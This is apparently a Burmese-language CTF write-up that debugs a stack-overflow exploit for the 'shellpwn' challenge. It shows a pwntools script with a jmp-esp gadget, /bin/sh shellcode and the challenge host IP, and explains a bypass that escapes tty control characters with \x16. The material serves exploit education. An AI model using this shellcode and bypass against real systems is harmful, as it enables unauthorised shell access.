# Shellcode is not working in remote

### Problem

ပုံမှန်ဆို shellcode ရှိတဲ့စီ jump ခုံသွားလိုက်ရင် shell က ရပြီ။

Local မှာတော့ shell ကအလုပ်လုပ်တယ်။ remote မှာဘာလို့အလုပ်မလုပ်တာလဲ။

	- Wrong shellcode
	- Shellcode address
	- Gadget 
	- Input Filter

အတာတွေထဲ တစ်ခုခုမှားလို့ပါ။

### Input Filter

Linux terminal မှာ input တွေ သေချာပြင်ဆင်ပေးတဲ့ **tty system** ရှိပါတယ်။

သူ့ရဲ့ **raw mode** မှာ input တွေကို ဒီတိုင်းပို့ပေးလို့ shellcode အတွက်ပြဿနာမရှိပါဘူး။

သူ့ရဲ့ **Canonical Mode** မှာဆို special *(control)* character filter တွေရှိတယ်။

**ဥပမာ**

```Hello<backspace>```
လို့ရိုက်လိုက်ရင် terminal မှာ
```Hello\x0f```
လို့ဝင်သွားတယ်။

အဲ့အခါ **\x0f** ကြောင့် ရှေ့တစ်လုံးကို tty က ဖြတ်ပေးသွားပါတယ်။```Hell```

ပြီးမှ program ကို ပို့ပေးပါတယ်။

>Shellcode ထဲက instruction bytes နဲ့ address တွေသာ control characters တွေနဲ့ သွားတူရင် payload က အလုပ်လုပ်တော့မှာ မဟုတ်ပါဘူး။

အဲ့ special character တွေဘယ်နှစ်လုံးတောင်ရှိတာလဲ။

ဒီ https://jvns.ca/ascii မှာ လှတပတလေးကြည့်လို့ရပါတယ်။

အရေးတကြီးလုပ်ဆောင်တာကတော့ အောက်က bytes တွေပါပဲ

| Function  | Default Byte | TTY Effect                     |
|-----------|--------------|--------------------------------|
| VINTR     | 0x03 (Ctrl-C) | Sends SIGINT                  |
| VQUIT     | 0x1C (Ctrl-\) | Sends SIGQUIT                 |
| VSUSP     | 0x1A (Ctrl-Z) | Sends SIGTSTP                 |
| VEOF      | 0x04 (Ctrl-D) | End of file (input ends)      |
| VERASE    | 0x7F (backspace) | Delete previous char     |
| VKILL     | 0x15 (Ctrl-U) | Kill whole line               |
| VWERASE   | 0x17 (Ctrl-W) | Erase previous word           |
| VLNEXT    | 0x16 (Ctrl-V) | Literal-next (quote next byte)|
| VREPRINT  | 0x12 (Ctrl-R) | Reprint current line          |
| VSTART    | 0x11 (Ctrl-Q) | Resume output                 |
| VSTOP     | 0x13 (Ctrl-S) | Stop output                   |
| VEOL      | 0x00          | Additional end-of-line        |
| VEOL2     | 0x00          | Second end-of-line            |

### Sample Program

NovaCTF တုန်းက shellpwn ဆိုတဲ့ file ကို အတူတူစမ်းကြည့်ပါမယ်။
```
from pwn import *

program = "./shellpwn"
host = "38.60.200.116"
port = 9005

# ------- setup ----------------
elf = context.binary = ELF(program, checksec=False)
if "remote" in sys.argv: p = remote(host,port)

elif "gdb" in sys.argv:
	gdbscript = """
	b * main
	b*0x08049248
	b*0x80491c3
	"""
	context.log_level = "DEBUG"
	p = process()
	gdb.attach(p,gdbscript)
	
else: p = process()


collect = p32(0x80491c8) # collect_feedback function
ret = p32(0x0804900e)
offset = 76  
jmp_esp = p32(0x80491c3)
jmp2 = p32(0x080491be) # add eax, 0x21ba ; jmp esp
# jmp2 to bypass the loop of esp


payload = b'0'*offset
# payload += b"\xc8\x91\x04\x08" #collect
payload += jmp_esp
# payload += b'\x90'*0x30
payload += b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"


p.sendline(payload)
p.interactive()
```
ပထမတော့ လုပ်နေကျပုံစံအတိုင်းပဲလုပ်လိုက်တာ Local မှာ shell ရပြီး remote မှာ မရဘူး။

> အဲ့ကတည်းက သိသင့်ပါတယ်ကွာ tty filter လုပ်ထားမှန်း။

Remote မှာ

	- NOP (\x90) တွေထည့်ပြီးစမ်းကြည့်တယ်။ မရဘူး
	- Shellcode တွေပြောင်းကြည့်တယ်။ မရဘူး
	- JUMP ESP ကို အမျိုးမျိုးပြောင်းစမ်းတယ်။ မရဘူး
	- Offset မမှန်ဘူးထင်လို့ bruteforce တိုက်ပြီး အရင်ဆုံး သူမှာပါတဲ့ collect_feedback ကို ပြန်ခေါ်ဖို့ လုပ်ကြည့်တယ်။ ရရင် သိသာတယ်။
	- နှစ်နာရီကြာသွားတယ်။ မရဘူး။ လီးလိုပဲဟေ့။
	- Address လွဲနေလောက်ထင်လို့ bruteforce ပြန်တယ်။ မရပြန်ဘူး။
    
အဲ့ဒါနဲ့ pwn မေးခွန်းထုတ်တဲ့သူက စောက်တလွဲ setup လုပ်ထားထင်လို့ တစ်ခြားဟာပဲပြောင်းလုပ်လိုက်တော့တယ်။

### Solution

ပြဿနာက *tty filter* ကြောင့်ပဲ။ သူများ writeup ဖတ်မှသိတယ်။

Collect_feedback ရဲ့ address **0x80491c8** မှာ \x04 ကပါတော့ အဲ့ byte က tty ကြောင့် EOF အလုပ်ကို လုပ်ပေးလိုက်ရရှာပါတယ်။

**ဘယ်လို bypass မလဲ။**

ရိုးရိုးရှင်းရှင်းလေးပါ။ ```\x16``` *(escape character)* ရှိပါတယ်။

\x16 နောက်မှာပါတဲ့ byte က Control character အနေနဲ့ အလုပ် မလုပ်တော့ပါဘူး။
လက်တွေ့လုပ်ကြည့်ရအောင်။

### Lab Setup

Terminal session တစ်ခုမှာ
```
socat -d -d TCP-LISTEN:4444,reuseaddr,fork EXEC:"./shellpwn",pty,ctty,stderr
```
ဒါလေး run ထားလိုက်မယ်။ ctty က tty filter အလုပ်လုပ်ခိုင်းတာပါ။

အရင် code ကိုပဲ remote ip ပြင်ပြီး စမ်းကြည့်မယ်။

```
host = "localhost" #"38.60.200.116"
port = 4444 #9005
```

ထင်တဲ့အတိုင်းပဲအလုပ်မလုပ်ဘူး။

အဲ့ဒါကို bypass လုပ်ဖို့အတွက် control characters တွေရဲ့ ရှေ့မှာ ```\x16``` ထားမှရမယ်။

 Control characters တွေက 0 ကနေ 31 အထိ ပြီးရင် နောက်တစ်လုံးက 0x7f (127) ဖြစ်တယ်။

```
def byPassTTY(shellcode):
	result = b''
	for i in shellcode:
		if(i < 32 or i==127): result += b'\x16'
		result += bytes([i])
	return result
```

Payload ဆောက်ပြီး ဒီ function ထဲမှာ \x16 လိုက်ထည့်ခိုင်းလိုက်ရင် final payload ရပြီ။
```
log.info(payload)
log.info(byPassTTY(payload))
p.sendline(byPassTTY(payload))
p.interactive()
```
ဒီလိုဆို shell  ရပြီ။
